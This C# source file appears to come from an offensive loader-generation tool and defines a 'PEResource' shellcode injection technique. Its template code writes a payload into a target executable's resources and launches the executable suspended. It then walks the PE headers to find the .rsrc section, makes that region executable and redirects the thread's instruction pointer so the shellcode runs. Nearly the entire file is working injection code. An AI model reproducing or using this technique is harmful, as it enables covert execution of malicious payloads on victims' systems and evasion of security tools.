using System.Collections.Generic;

namespace SingleDose.Techniques.Injects
{
    internal class PEResource : ITechnique
    {
        string ITechnique.TechniqueName => "PEResource";

        string ITechnique.TechniqueDescription => "This method updates a file on disk before execution. The update adds  the shellcode as a bitmap resource to the target executable. " +
            "The process is started as suspended allowing the inject to calulate the memory address of the shellcode. Once identified, the instruction pointer is set to " +
            "that memory address. When the process resumes, the shellcode   will be executed.";

        List<string> ITechnique.TechniqueReferences => new List<string>() 
        {
            @"https://github.com/Wra7h/PEResourceInject",
            @"https://0xrick.github.io/win-internals/pe8/"
        };

        bool ITechnique.IsUnsafe => false;

        bool ITechnique.IsLoader => false;
        List<string> ITechnique.Invokes => new List<string>() { "BeginUpdateResource", "UpdateResource", "EndUpdateResource", "CreateProcess", "NtQueryInformationProcess",
            "ReadProcessMemory", "VirtualProtectEx", "GetThreadContext", "SetThreadContext", "ResumeThread", "CloseHandle" };
        List<string> ITechnique.Prerequisites => new List<string>() { "SpawnProcess" };
        string ITechnique.Base => @"using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;

namespace {{NAMESPACE}}
{
    class Program
    {
        static void Main(string[] args)
        {
            {{MODE}}
            {{TRIGGER}}
            string FileToInfect = {{SPAWNPROCESS}};
            string TempFile = Path.GetTempFileName();
            File.Copy(FileToInfect, TempFile, true);
            
            if (File.Exists(TempFile))
            {
                Console.WriteLine(""[*] Created backup: {0}"", TempFile);
            }

            IntPtr hUpdate = BeginUpdateResource(FileToInfect, true);
            if (hUpdate == IntPtr.Zero)
            {
                Console.WriteLine(""BeginUpdateResource failed. Exiting..."");
                System.Environment.Exit(1);
            }

            bool bvRet = UpdateResource(hUpdate, (IntPtr)2, (IntPtr)2, 0, payload, (uint)payload.Length);
            if (!bvRet)
            {
                Console.WriteLine(""UpdateResource failed. Exiting..."");
                System.Environment.Exit(1);
            }

            bvRet = EndUpdateResource(hUpdate, false);
            if (!bvRet)
            {
                Console.WriteLine(""EndUpdateResource failed. Exiting..."");
                System.Environment.Exit(1);
            }

            STARTUPINFO sSI = new STARTUPINFO();
            PROCESS_INFORMATION sPI = new PROCESS_INFORMATION();
            bvRet = CreateProcess(FileToInfect, String.Empty, IntPtr.Zero, IntPtr.Zero,
                false, 0x4 /*Suspended*/, IntPtr.Zero, Directory.GetCurrentDirectory(), ref sSI, out sPI);
            if (!bvRet)
            {
                Console.WriteLine(""CreateProcess failed. Exiting..."");
                System.Environment.Exit(1);
            }
            
            PROCESS_BASIC_INFORMATION sPBI = new PROCESS_BASIC_INFORMATION();
            int cbRet = 0;
            NtQueryInformationProcess(sPI.hProcess, 0, out sPBI, Marshal.SizeOf(sPBI), out cbRet);
            IntPtr PEBOffset = (IntPtr)(sPBI.PebAddress.ToInt64() + 0x10);

            byte[] ImageBase = new byte[8];
            IntPtr NumRead = IntPtr.Zero;
            bvRet = ReadProcessMemory(sPI.hProcess, PEBOffset, ImageBase, 8, out NumRead);
            if (!bvRet)
            {
                Console.WriteLine(""ReadProcessMemory: Imagebase failed. Exiting..."");
                System.Environment.Exit(1);
            }
            IntPtr pImageBase = (IntPtr)BitConverter.ToInt64(ImageBase, 0);

            byte[] bIDOSH = new byte[Marshal.SizeOf(typeof(IMAGE_DOS_HEADER))];
            bvRet = ReadProcessMemory(sPI.hProcess, pImageBase, bIDOSH, Marshal.SizeOf(typeof(IMAGE_DOS_HEADER)), out NumRead);
            if (!bvRet)
            {
                Console.WriteLine(""ReadProcessMemory: IMAGE_DOS_HEADER failed. Exiting..."");
                System.Environment.Exit(1);
            }
            GCHandle pbIDOSH = GCHandle.Alloc(bIDOSH, GCHandleType.Pinned);
            IMAGE_DOS_HEADER sImageDOSHeader = (IMAGE_DOS_HEADER)Marshal.PtrToStructure(pbIDOSH.AddrOfPinnedObject(), typeof(IMAGE_DOS_HEADER));

            IntPtr pAddressImageNTHeader = ((IntPtr)(pImageBase.ToInt64() + sImageDOSHeader.e_lfanew));
            byte[] bImageNTHeader = new byte[Marshal.SizeOf(typeof(IMAGE_NT_HEADERS64))];
            bvRet = ReadProcessMemory(sPI.hProcess, pAddressImageNTHeader, bImageNTHeader, Marshal.SizeOf(typeof(IMAGE_NT_HEADERS64)), out NumRead);
            if (!bvRet)
            {
                Console.WriteLine(""ReadProcessMemory: IMAGE_NT_HEADER failed. Exiting..."");
                System.Environment.Exit(1);
            }
            GCHandle pbImageNTHeader = GCHandle.Alloc(bImageNTHeader, GCHandleType.Pinned);
            IMAGE_NT_HEADERS64 sImageNTHeader = (IMAGE_NT_HEADERS64)Marshal.PtrToStructure(pbImageNTHeader.AddrOfPinnedObject(), typeof(IMAGE_NT_HEADERS64));

            IntPtr pAddressOfSection = (IntPtr)(pAddressImageNTHeader.ToInt64() + (sizeof(uint) + Marshal.SizeOf(typeof(IMAGE_FILE_HEADER)) + sImageNTHeader.FileHeader.SizeOfOptionalHeader));
            IntPtr pAddressShellcodeStart = IntPtr.Zero;
            for (int i = 0; i < sImageNTHeader.FileHeader.NumberOfSections; i++)
            {
                byte[] bImageSectionHeader = new byte[Marshal.SizeOf(typeof(IMAGE_SECTION_HEADER))];
                bvRet = ReadProcessMemory(sPI.hProcess, pAddressOfSection, bImageSectionHeader, Marshal.SizeOf(typeof(IMAGE_SECTION_HEADER)), out NumRead);
                if (!bvRet)
                {
                    Console.WriteLine(""ReadProcessMemory: IMAGE_SECTION_HEADER {0} failed."", i);
                    continue;
                }
                GCHandle pbImageSectionHeader = GCHandle.Alloc(bImageSectionHeader, GCHandleType.Pinned);
                IMAGE_SECTION_HEADER sImageSectionHeader = (IMAGE_SECTION_HEADER)Marshal.PtrToStructure(pbImageSectionHeader.AddrOfPinnedObject(), typeof(IMAGE_SECTION_HEADER));

                if (new string(sImageSectionHeader.Name).StartsWith("".rsrc""))
                {
                    pAddressShellcodeStart = (IntPtr)(pImageBase.ToInt64() + sImageSectionHeader.VirtualAddress + 0x58);
                    uint oldProtect = 0;
                    VirtualProtectEx(sPI.hProcess, pAddressShellcodeStart, payload.Length, 0x20, out oldProtect);
                    break;
                }

                pAddressOfSection = (IntPtr)(pAddressOfSection.ToInt64() + Marshal.SizeOf(typeof(IMAGE_SECTION_HEADER)));
            }

            CONTEXT64 sC64 = new CONTEXT64();
            sC64.ContextFlags = CONTEXT_FLAGS.CONTEXT_ALL;
            IntPtr psC64 = Marshal.AllocHGlobal(Marshal.SizeOf(sC64));
            Marshal.StructureToPtr(sC64, psC64, false);
            bvRet = GetThreadContext(sPI.hThread, psC64);
            sC64 = (CONTEXT64)Marshal.PtrToStructure(psC64, typeof(CONTEXT64));
            sC64.Rip = (ulong)pAddressShellcodeStart.ToInt64();
            Marshal.StructureToPtr(sC64, psC64, false);
            bvRet = SetThreadContext(sPI.hThread, psC64);

            ResumeThread(sPI.hThread);
            CloseHandle(sPI.hThread);
            CloseHandle(sPI.hProcess);
        }

        {{ARGS}}

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Explicit)]
        public struct IMAGE_SECTION_HEADER
        {
            [FieldOffset(0)]
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public char[] Name;
            [FieldOffset(8)]
            public UInt32 VirtualSize;
            [FieldOffset(12)]
            public UInt32 VirtualAddress;
            [FieldOffset(16)]
            public UInt32 SizeOfRawData;
            [FieldOffset(20)]
            public UInt32 PointerToRawData;
            [FieldOffset(24)]
            public UInt32 PointerToRelocations;
            [FieldOffset(28)]
            public UInt32 PointerToLinenumbers;
            [FieldOffset(32)]
            public UInt16 NumberOfRelocations;
            [FieldOffset(34)]
            public UInt16 NumberOfLinenumbers;
            [FieldOffset(36)]
            public DataSectionFlags Characteristics;

            public string Section
            {
                get { return new string(Name); }
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr ExitStatus;
            public IntPtr PebAddress;
            public IntPtr AffinityMask;
            public IntPtr BasePriority;
            public IntPtr UniquePID;
            public IntPtr InheritedFromUniqueProcessId;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_DOS_HEADER
        {
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)]
            public char[] e_magic;       // Magic number
            public UInt16 e_cblp;    // Bytes on last page of file
            public UInt16 e_cp;      // Pages in file
            public UInt16 e_crlc;    // Relocations
            public UInt16 e_cparhdr;     // Size of header in paragraphs
            public UInt16 e_minalloc;    // Minimum extra paragraphs needed
            public UInt16 e_maxalloc;    // Maximum extra paragraphs needed
            public UInt16 e_ss;      // Initial (relative) SS value
            public UInt16 e_sp;      // Initial SP value
            public UInt16 e_csum;    // Checksum
            public UInt16 e_ip;      // Initial IP value
            public UInt16 e_cs;      // Initial (relative) CS value
            public UInt16 e_lfarlc;      // File address of relocation table
            public UInt16 e_ovno;    // Overlay number
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
            public UInt16[] e_res1;    // Reserved words
            public UInt16 e_oemid;       // OEM identifier (for e_oeminfo)
            public UInt16 e_oeminfo;     // OEM information; e_oemid specific
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
            public UInt16[] e_res2;    // Reserved words
            public Int32 e_lfanew;      // File address of new exe header

            private string _e_magic
            {
                get { return new string(e_magic); }
            }

            public bool isValid
            {
                get { return _e_magic == ""MZ""; }
            }
        }

        [Flags]
        public enum DataSectionFlags : uint
        {
            TypeReg = 0x00000000,
            TypeDsect = 0x00000001,
            TypeNoLoad = 0x00000002,
            TypeGroup = 0x00000004,
            TypeNoPadded = 0x00000008,
            TypeCopy = 0x00000010,
            ContentCode = 0x00000020,
            ContentInitializedData = 0x00000040,
            ContentUninitializedData = 0x00000080,
            LinkOther = 0x00000100,
            LinkInfo = 0x00000200,
            TypeOver = 0x00000400,
            LinkRemove = 0x00000800,
            LinkComDat = 0x00001000,
            NoDeferSpecExceptions = 0x00004000,
            RelativeGP = 0x00008000,
            MemPurgeable = 0x00020000,
            Memory16Bit = 0x00020000,
            MemoryLocked = 0x00040000,
            MemoryPreload = 0x00080000,
            Align1Bytes = 0x00100000,
            Align2Bytes = 0x00200000,
            Align4Bytes = 0x00300000,
            Align8Bytes = 0x00400000,
            Align16Bytes = 0x00500000,
            Align32Bytes = 0x00600000,
            Align64Bytes = 0x00700000,
            Align128Bytes = 0x00800000,
            Align256Bytes = 0x00900000,
            Align512Bytes = 0x00A00000,
            Align1024Bytes = 0x00B00000,
            Align2048Bytes = 0x00C00000,
            Align4096Bytes = 0x00D00000,
            Align8192Bytes = 0x00E00000,
            LinkExtendedRelocationOverflow = 0x01000000,
            MemoryDiscardable = 0x02000000,
            MemoryNotCached = 0x04000000,
            MemoryNotPaged = 0x08000000,
            MemoryShared = 0x10000000,
            MemoryExecute = 0x20000000,
            MemoryRead = 0x40000000,
            MemoryWrite = 0x80000000
        }

        [StructLayout(LayoutKind.Explicit)]
        public struct IMAGE_NT_HEADERS64
        {
            [FieldOffset(0)]
            public UInt32 Signature;

            [FieldOffset(4)]
            public IMAGE_FILE_HEADER FileHeader;

            [FieldOffset(24)]
            public IMAGE_OPTIONAL_HEADER64 OptionalHeader;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_FILE_HEADER
        {
            public UInt16 Machine;
            public UInt16 NumberOfSections;
            public UInt32 TimeDateStamp;
            public UInt32 PointerToSymbolTable;
            public UInt32 NumberOfSymbols;
            public UInt16 SizeOfOptionalHeader;
            public UInt16 Characteristics;
        }

        [StructLayout(LayoutKind.Explicit)]
        public struct IMAGE_OPTIONAL_HEADER64
        {
            [FieldOffset(0)]
            public ushort Magic;

            [FieldOffset(2)]
            public byte MajorLinkerVersion;

            [FieldOffset(3)]
            public byte MinorLinkerVersion;

            [FieldOffset(4)]
            public uint SizeOfCode;

            [FieldOffset(8)]
            public uint SizeOfInitializedData;

            [FieldOffset(12)]
            public uint SizeOfUninitializedData;

            [FieldOffset(16)]
            public uint AddressOfEntryPoint;

            [FieldOffset(20)]
            public uint BaseOfCode;

            [FieldOffset(24)]
            public ulong ImageBase;

            [FieldOffset(32)]
            public uint SectionAlignment;

            [FieldOffset(36)]
            public uint FileAlignment;

            [FieldOffset(40)]
            public ushort MajorOperatingSystemVersion;

            [FieldOffset(42)]
            public ushort MinorOperatingSystemVersion;

            [FieldOffset(44)]
            public ushort MajorImageVersion;

            [FieldOffset(46)]
            public ushort MinorImageVersion;

            [FieldOffset(48)]
            public ushort MajorSubsystemVersion;

            [FieldOffset(50)]
            public ushort MinorSubsystemVersion;

            [FieldOffset(52)]
            public uint Win32VersionValue;

            [FieldOffset(56)]
            public uint SizeOfImage;

            [FieldOffset(60)]
            public uint SizeOfHeaders;

            [FieldOffset(64)]
            public uint CheckSum;

            [FieldOffset(68)]
            public ushort Subsystem;

            [FieldOffset(70)]
            public ushort DllCharacteristics;

            [FieldOffset(72)]
            public ulong SizeOfStackReserve;

            [FieldOffset(80)]
            public ulong SizeOfStackCommit;

            [FieldOffset(88)]
            public ulong SizeOfHeapReserve;

            [FieldOffset(96)]
            public ulong SizeOfHeapCommit;

            [FieldOffset(104)]
            public uint LoaderFlags;

            [FieldOffset(108)]
            public uint NumberOfRvaAndSizes;

            [FieldOffset(112)]
            public IMAGE_DATA_DIRECTORY ExportTable;

            [FieldOffset(120)]
            public IMAGE_DATA_DIRECTORY ImportTable;

            [FieldOffset(128)]
            public IMAGE_DATA_DIRECTORY ResourceTable;

            [FieldOffset(136)]
            public IMAGE_DATA_DIRECTORY ExceptionTable;

            [FieldOffset(144)]
            public IMAGE_DATA_DIRECTORY CertificateTable;

            [FieldOffset(152)]
            public IMAGE_DATA_DIRECTORY BaseRelocationTable;

            [FieldOffset(160)]
            public IMAGE_DATA_DIRECTORY Debug;

            [FieldOffset(168)]
            public IMAGE_DATA_DIRECTORY Architecture;

            [FieldOffset(176)]
            public IMAGE_DATA_DIRECTORY GlobalPtr;

            [FieldOffset(184)]
            public IMAGE_DATA_DIRECTORY TLSTable;

            [FieldOffset(192)]
            public IMAGE_DATA_DIRECTORY LoadConfigTable;

            [FieldOffset(200)]
            public IMAGE_DATA_DIRECTORY BoundImport;

            [FieldOffset(208)]
            public IMAGE_DATA_DIRECTORY IAT;

            [FieldOffset(216)]
            public IMAGE_DATA_DIRECTORY DelayImportDescriptor;

            [FieldOffset(224)]
            public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;

            [FieldOffset(232)]
            public IMAGE_DATA_DIRECTORY Reserved;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_DATA_DIRECTORY
        {
            public UInt32 VirtualAddress;
            public UInt32 Size;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct CONTEXT64
        {
            public ulong P1Home;
            public ulong P2Home;
            public ulong P3Home;
            public ulong P4Home;
            public ulong P5Home;
            public ulong P6Home;

            public CONTEXT_FLAGS ContextFlags;
            public uint MxCsr;

            public ushort SegCs;
            public ushort SegDs;
            public ushort SegEs;
            public ushort SegFs;
            public ushort SegGs;
            public ushort SegSs;
            public uint EFlags;

            public ulong Dr0;
            public ulong Dr1;
            public ulong Dr2;
            public ulong Dr3;
            public ulong Dr6;
            public ulong Dr7;

            public ulong Rax;
            public ulong Rcx;
            public ulong Rdx;
            public ulong Rbx;
            public ulong Rsp;
            public ulong Rbp;
            public ulong Rsi;
            public ulong Rdi;
            public ulong R8;
            public ulong R9;
            public ulong R10;
            public ulong R11;
            public ulong R12;
            public ulong R13;
            public ulong R14;
            public ulong R15;
            public ulong Rip;

            public XSAVE_FORMAT64 DUMMYUNIONNAME;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 26)]
            public M128A[] VectorRegister;
            public ulong VectorControl;

            public ulong DebugControl;
            public ulong LastBranchToRip;
            public ulong LastBranchFromRip;
            public ulong LastExceptionToRip;
            public ulong LastExceptionFromRip;
        }

        public enum CONTEXT_FLAGS : uint
        {
            CONTEXT_i386 = 0x10000,
            CONTEXT_i486 = 0x10000,   //  same as i386
            CONTEXT_CONTROL = CONTEXT_i386 | 0x01, // SS:SP, CS:IP, FLAGS, BP
            CONTEXT_INTEGER = CONTEXT_i386 | 0x02, // AX, BX, CX, DX, SI, DI
            CONTEXT_SEGMENTS = CONTEXT_i386 | 0x04, // DS, ES, FS, GS
            CONTEXT_FLOATING_POINT = CONTEXT_i386 | 0x08, // 387 state
            CONTEXT_DEBUG_REGISTERS = CONTEXT_i386 | 0x10, // DB 0-3,6,7
            CONTEXT_EXTENDED_REGISTERS = CONTEXT_i386 | 0x20, // cpu specific extensions
            CONTEXT_FULL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS,
            CONTEXT_ALL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS | CONTEXT_FLOATING_POINT | CONTEXT_DEBUG_REGISTERS | CONTEXT_EXTENDED_REGISTERS
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct M128A
        {
            public ulong High;
            public long Low;

            public override string ToString()
            {
                return string.Format(""High:{0}, Low:{1}"", this.High, this.Low);
            }
        }

        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct XSAVE_FORMAT64
        {
            public ushort ControlWord;
            public ushort StatusWord;
            public byte TagWord;
            public byte Reserved1;
            public ushort ErrorOpcode;
            public uint ErrorOffset;
            public ushort ErrorSelector;
            public ushort Reserved2;
            public uint DataOffset;
            public ushort DataSelector;
            public ushort Reserved3;
            public uint MxCsr;
            public uint MxCsr_Mask;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public M128A[] FloatRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public M128A[] XmmRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 96)]
            public byte[] Reserved4;
        }

        {{INVOKE}}
    }
}";
        string ITechnique.VProtect => null;
    }
}
